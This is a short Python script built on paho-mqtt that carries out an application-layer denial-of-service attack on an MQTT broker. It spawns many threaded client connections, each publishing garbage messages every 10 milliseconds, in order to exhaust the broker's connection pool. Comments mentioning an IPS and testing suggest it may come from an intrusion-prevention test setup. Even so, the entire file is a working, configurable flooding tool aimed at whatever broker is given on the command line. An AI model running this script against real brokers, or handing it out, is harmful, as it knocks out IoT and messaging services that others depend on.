import paho.mqtt.client as mqtt
import threading
import time
import argparse
import random

def on_disconnect(client, userdata, rc):
    if rc != 0:
        print(f"🚨 CONNECTION KILLED BY IPS: TCP connection reset by peer!")

def attack(broker, port, thread_id):
    try:
        client_id = f"attacker_{thread_id}_{random.randint(1000, 9999)}"
        client = mqtt.Client(client_id)
        client.on_disconnect = on_disconnect
        client.connect(broker, port, 60)
        # Keep connection open to exhaust connection pools (Application-level attack)
        client.loop_start()
        print(f"[{thread_id}] Connected to broker: {client_id}")
        while True:
            # Publish garbage data rapidly
            client.publish("sensors/flood", f"Garbage_{random.random()}", qos=1)
            time.sleep(0.01)
    except Exception as e:
        print(f"[{thread_id}] Connection failed: {e}")

# Module-level parser for testing
parser = argparse.ArgumentParser(description="MQTT Application-Layer DoS")
parser.add_argument("--broker", required=True, help="MQTT Broker IP")
parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
parser.add_argument("--threads", type=int, default=50, help="Number of concurrent attacking connections")

if __name__ == "__main__":
    args = parser.parse_args()
    
    print(f"Starting Application-level MQTT attack against {args.broker}:{args.port} with {args.threads} threads...")
    
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack, args=(args.broker, args.port, i))
        t.start()
        threads.append(t)
        time.sleep(0.05) # Prevent instant local resource exhaustion
        
    for t in threads:
        t.join()
